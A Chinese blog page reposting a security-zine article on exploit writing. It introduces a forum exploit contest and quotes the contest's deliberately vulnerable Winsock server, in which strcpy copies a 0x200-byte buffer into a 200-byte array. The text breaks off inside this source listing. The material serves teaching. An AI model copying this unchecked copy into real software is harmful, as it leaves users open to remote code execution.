<!doctype html><html lang=zh-CN data-theme=dark><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.152.2"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_32_32_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_128_128_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="做一个优秀的木匠"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta name=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://blogs.qipai360.cn/imgs/avatar.jpg"><meta itemprop=keywords content="Rise,ZhangTuohui,技术,C++,Unity3D,Lua,NodeJS,C#,JavaScript,游戏开发,机器学习,深度学习,AI,编程,编程语言,编程技术,编程开发,游戏引擎,游戏设计,游戏制作,游戏开发者,游戏开发者博客,游戏开发者网站,游戏开发者工具,游戏开发者教程,游戏开发者学习,游戏开发者交流,游戏开发者分享,游戏开发者经验,游戏开发者心得,游戏开发者技巧,游戏开发者方法,游戏开发者思路,游戏开发者理念,游戏开发者文化,游戏开发者精神,游戏开发者信仰"><meta property="og:type" content="article"><meta property="og:title" content="做一个优秀的木匠"><meta property="og:description" content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://blogs.qipai360.cn/post/be-a-good-carpenter/"><meta property="og:site_name" content="Rise的自留地"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Rise"><meta property="article:published_time" content="2008-08-15 09:25:00 +0800 +0800"><meta property="article:modified_time" content="2008-08-15 09:25:00 +0800 +0800"><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1761990626"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return 0[0];const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),0[0]):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "2b23669184fc49269e400525ac2447d9"}'></script><title>做一个优秀的木匠 - Rise的自留地</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Rise的自留地</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>记录生活中的点滴，分享编程技术和游戏开发经验。</p></div><div class=site-nav-right><div class="toggle popup-trigger"></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>678</span></a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-message"><a href=/message/ class=hvr-icon-pulse rel=section><i class="fa fa-comments hvr-icon"></i>留言板</a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li></ul></nav></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-overview-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=Rise src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>Rise</p><div class=site-description itemprop=description>福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>678</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>34</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>117</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/rise-worlds title="Github → https://github.com/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github
</a></span><span class=links-of-social-item><a href=mailto:rise.worlds@outlook.com title="E-Mail → mailto:rise.worlds@outlook.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
E-Mail
</a></span><span class=links-of-social-item><a href=https://www.zhihu.com/people/rise-worlds title="知乎 → https://www.zhihu.com/people/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-book fa-fw hvr-icon"></i>
知乎
</a></span><span class=links-of-social-item><a href=https://twitter.com/riseworlds title="Twitter → https://twitter.com/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-twitter fa-fw hvr-icon"></i>
Twitter
</a></span><span class=links-of-social-item><a href=https://www.facebook.com/rise.worlds title="facebook → https://www.facebook.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-facebook fa-fw hvr-icon"></i>
facebook
</a></span><span class=links-of-social-item><a href=https://youtube.com/@YiXuan title="YouTube → https://youtube.com/@YiXuan" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-youtube fa-fw hvr-icon"></i>
YouTube
</a></span><span class=links-of-social-item><a href=https://instagram.com/rise.worlds title="Instagram → https://instagram.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-instagram fa-fw hvr-icon"></i>
Instagram
</a></span><span class=links-of-social-item><a href=https://t.me/riseworlds title="Telegram → https://t.me/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-telegram fa-fw hvr-icon"></i>
Telegram</a></span></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://www.qipai360.cn title=https://www.qipai360.cn target=_blank>Qipai360</a></li><li class=links-of-blogroll-item><a href=https://www.cnblogs.com/flying_bat title=https://www.cnblogs.com/flying_bat target=_blank>博客园</a></li><li class=links-of-blogroll-item><a href=https://zishu.me title=https://zishu.me target=_blank>子舒的博客</a></li><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2004-10-06 15:24:00 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=2418817></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=5198></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-11-01 14:55:00 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/rise-worlds rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/be-a-good-carpenter/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="做一个优秀的木匠"><meta itemprop=description content="                      ==Ph4nt0m Security Team==
                   Issue 0x01, Phile #0x03 of 0x06  

|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=[       做一个优秀的木匠      ]=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;=[           By F.Zh             ]=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
[本文内容可能会伤及到部分名人粉丝感情，作者表示仅为插科打诨之用，并无恶意]
有副图描述了从发现漏洞到最后盈利的过程，大概意思是研究人员发现了房子的漏洞，木
匠针对漏洞造了一个梯子，最后脚本小子进屋偷东西。国内的圈子里面，玩票性质的安全爱好
者大多不愿意做脚本小子，同时也不见得有足够的时间去找房子的漏洞，所以闲暇时候基本上
做做木匠活当消遣。但木匠也是有三六九等的，有朱由校，有鲁班，也有就只能给地主老财家
做楠木棺材的。作为一个有职业道德的木匠，显然应该努力向前面两个靠拢，因为只能做做楠
木棺材的，未免也太失面子了。
这篇文章就从国内某著名破解论坛搞的科普竞赛开始，由一个楠木棺材级别的木匠挣扎
着介绍一下放眼能够看到的技巧。在切入正题前，有必要介绍一下科普竞赛的背景和结果：
大约是看到windows漏洞太值钱，破解组织也开始搞起了逆向和exploit，而且还以竞赛的方
式来引起非木匠的关注。科普竞赛的题目是两道，如Sowhat所说
(

    http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html
    
)，第二道题是
可以Google到的，而第一道题显然是个送分题，因此科普竞赛实际上是个比手快的过程。最
后结果是nop拿了第一，这个名字让人不禁联想到了五一国际劳动节和革命先烈鲜血的颜色，
当然，我们依然怀着无比的敬仰和美好的期望，希望这个nop不是职业运动员参加了业余比赛。
先看看存在问题的程序。逆向很简单，但是为了方便，还是直接给出官方公布的源代码。
具有严重自虐倾向的木匠请编译后用ida逆向一下，并自备低温蜡烛和爱心小皮鞭。
========================和谐的分割线================================="></span><header class=post-header><h1 class=post-title itemprop="name headline">做一个优秀的木匠</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年08月15日 09:25:00 CST" itemprop="dateCreated datePublished" datetime="2008-08-15 09:25:00 +0800 +0800">2008年08月15日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/capricethink/ itemprop=url rel=index><span itemprop=name>CapriceThink</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>6520</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>14分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/be-a-good-carpenter/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><pre><code>                      ==Ph4nt0m Security Team==
                   Issue 0x01, Phile #0x03 of 0x06  
</code></pre><p>|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=[ 做一个优秀的木匠 ]=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;=[ By F.Zh ]=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|
|=&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;=|<br>[本文内容可能会伤及到部分名人粉丝感情，作者表示仅为插科打诨之用，并无恶意]
有副图描述了从发现漏洞到最后盈利的过程，大概意思是研究人员发现了房子的漏洞，木
匠针对漏洞造了一个梯子，最后脚本小子进屋偷东西。国内的圈子里面，玩票性质的安全爱好
者大多不愿意做脚本小子，同时也不见得有足够的时间去找房子的漏洞，所以闲暇时候基本上
做做木匠活当消遣。但木匠也是有三六九等的，有朱由校，有鲁班，也有就只能给地主老财家
做楠木棺材的。作为一个有职业道德的木匠，显然应该努力向前面两个靠拢，因为只能做做楠
木棺材的，未免也太失面子了。<br>这篇文章就从国内某著名破解论坛搞的科普竞赛开始，由一个楠木棺材级别的木匠挣扎
着介绍一下放眼能够看到的技巧。在切入正题前，有必要介绍一下科普竞赛的背景和结果：
大约是看到windows漏洞太值钱，破解组织也开始搞起了逆向和exploit，而且还以竞赛的方
式来引起非木匠的关注。科普竞赛的题目是两道，如Sowhat所说
(<a href=http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html)，第二道题是>
<a href=http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html title=http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html rel="noopener external nofollow noreferrer" target=_blank class=exturl>http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html
</a>)，第二道题是</a>
可以Google到的，而第一道题显然是个送分题，因此科普竞赛实际上是个比手快的过程。最
后结果是nop拿了第一，这个名字让人不禁联想到了五一国际劳动节和革命先烈鲜血的颜色，
当然，我们依然怀着无比的敬仰和美好的期望，希望这个nop不是职业运动员参加了业余比赛。
先看看存在问题的程序。逆向很简单，但是为了方便，还是直接给出官方公布的源代码。
具有严重自虐倾向的木匠请编译后用ida逆向一下，并自备低温蜡烛和爱心小皮鞭。
========================和谐的分割线=================================</p><a id=more></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1> 1</a>
</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2> 2</a>
</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3> 3</a>
</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4> 4</a>
</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5> 5</a>
</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6> 6</a>
</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7> 7</a>
</span><span class=lnt id=hl-0-8><a class=lnlinks href=#hl-0-8> 8</a>
</span><span class=lnt id=hl-0-9><a class=lnlinks href=#hl-0-9> 9</a>
</span><span class=lnt id=hl-0-10><a class=lnlinks href=#hl-0-10>10</a>
</span><span class=lnt id=hl-0-11><a class=lnlinks href=#hl-0-11>11</a>
</span><span class=lnt id=hl-0-12><a class=lnlinks href=#hl-0-12>12</a>
</span><span class=lnt id=hl-0-13><a class=lnlinks href=#hl-0-13>13</a>
</span><span class=lnt id=hl-0-14><a class=lnlinks href=#hl-0-14>14</a>
</span><span class=lnt id=hl-0-15><a class=lnlinks href=#hl-0-15>15</a>
</span><span class=lnt id=hl-0-16><a class=lnlinks href=#hl-0-16>16</a>
</span><span class=lnt id=hl-0-17><a class=lnlinks href=#hl-0-17>17</a>
</span><span class=lnt id=hl-0-18><a class=lnlinks href=#hl-0-18>18</a>
</span><span class=lnt id=hl-0-19><a class=lnlinks href=#hl-0-19>19</a>
</span><span class=lnt id=hl-0-20><a class=lnlinks href=#hl-0-20>20</a>
</span><span class=lnt id=hl-0-21><a class=lnlinks href=#hl-0-21>21</a>
</span><span class=lnt id=hl-0-22><a class=lnlinks href=#hl-0-22>22</a>
</span><span class=lnt id=hl-0-23><a class=lnlinks href=#hl-0-23>23</a>
</span><span class=lnt id=hl-0-24><a class=lnlinks href=#hl-0-24>24</a>
</span><span class=lnt id=hl-0-25><a class=lnlinks href=#hl-0-25>25</a>
</span><span class=lnt id=hl-0-26><a class=lnlinks href=#hl-0-26>26</a>
</span><span class=lnt id=hl-0-27><a class=lnlinks href=#hl-0-27>27</a>
</span><span class=lnt id=hl-0-28><a class=lnlinks href=#hl-0-28>28</a>
</span><span class=lnt id=hl-0-29><a class=lnlinks href=#hl-0-29>29</a>
</span><span class=lnt id=hl-0-30><a class=lnlinks href=#hl-0-30>30</a>
</span><span class=lnt id=hl-0-31><a class=lnlinks href=#hl-0-31>31</a>
</span><span class=lnt id=hl-0-32><a class=lnlinks href=#hl-0-32>32</a>
</span><span class=lnt id=hl-0-33><a class=lnlinks href=#hl-0-33>33</a>
</span><span class=lnt id=hl-0-34><a class=lnlinks href=#hl-0-34>34</a>
</span><span class=lnt id=hl-0-35><a class=lnlinks href=#hl-0-35>35</a>
</span><span class=lnt id=hl-0-36><a class=lnlinks href=#hl-0-36>36</a>
</span><span class=lnt id=hl-0-37><a class=lnlinks href=#hl-0-37>37</a>
</span><span class=lnt id=hl-0-38><a class=lnlinks href=#hl-0-38>38</a>
</span><span class=lnt id=hl-0-39><a class=lnlinks href=#hl-0-39>39</a>
</span><span class=lnt id=hl-0-40><a class=lnlinks href=#hl-0-40>40</a>
</span><span class=lnt id=hl-0-41><a class=lnlinks href=#hl-0-41>41</a>
</span><span class=lnt id=hl-0-42><a class=lnlinks href=#hl-0-42>42</a>
</span><span class=lnt id=hl-0-43><a class=lnlinks href=#hl-0-43>43</a>
</span><span class=lnt id=hl-0-44><a class=lnlinks href=#hl-0-44>44</a>
</span><span class=lnt id=hl-0-45><a class=lnlinks href=#hl-0-45>45</a>
</span><span class=lnt id=hl-0-46><a class=lnlinks href=#hl-0-46>46</a>
</span><span class=lnt id=hl-0-47><a class=lnlinks href=#hl-0-47>47</a>
</span><span class=lnt id=hl-0-48><a class=lnlinks href=#hl-0-48>48</a>
</span><span class=lnt id=hl-0-49><a class=lnlinks href=#hl-0-49>49</a>
</span><span class=lnt id=hl-0-50><a class=lnlinks href=#hl-0-50>50</a>
</span><span class=lnt id=hl-0-51><a class=lnlinks href=#hl-0-51>51</a>
</span><span class=lnt id=hl-0-52><a class=lnlinks href=#hl-0-52>52</a>
</span><span class=lnt id=hl-0-53><a class=lnlinks href=#hl-0-53>53</a>
</span><span class=lnt id=hl-0-54><a class=lnlinks href=#hl-0-54>54</a>
</span><span class=lnt id=hl-0-55><a class=lnlinks href=#hl-0-55>55</a>
</span><span class=lnt id=hl-0-56><a class=lnlinks href=#hl-0-56>56</a>
</span><span class=lnt id=hl-0-57><a class=lnlinks href=#hl-0-57>57</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include&lt;iostream.h&gt;
</span></span></span><span class=line><span class=cl><span class=cp>#include&lt;winsock2.h&gt;
</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;ws2_32.lib&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>msg_display</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span> <span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>msg</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>strcpy</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span><span class=n>buf</span><span class=p>);</span><span class=c1>// overflow here, copy 0x200 to 200
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;********************&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;received:&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=n>msg</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>sock</span><span class=p>,</span><span class=n>msgsock</span><span class=p>,</span><span class=n>lenth</span><span class=p>,</span><span class=n>receive_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=nc>sockaddr_in</span> <span class=n>sock_server</span><span class=p>,</span><span class=n>sock_client</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x200</span><span class=p>];</span> <span class=c1>//noticed it is 0x200
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>WSADATA</span> <span class=n>wsa</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>WSAStartup</span><span class=p>(</span><span class=n>MAKEWORD</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>wsa</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>((</span><span class=n>sock</span><span class=o>=</span><span class=n>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span><span class=n>SOCK_STREAM</span><span class=p>,</span><span class=mi>0</span><span class=p>))</span><span class=o>&lt;</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=n>sock</span><span class=o>&lt;&lt;</span><span class=s>&#34;socket creating error!&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>sock_server</span><span class=p>.</span><span class=n>sin_family</span><span class=o>=</span><span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>sock_server</span><span class=p>.</span><span class=n>sin_port</span><span class=o>=</span><span class=n>htons</span><span class=p>(</span><span class=mi>7777</span><span class=p>);</span>
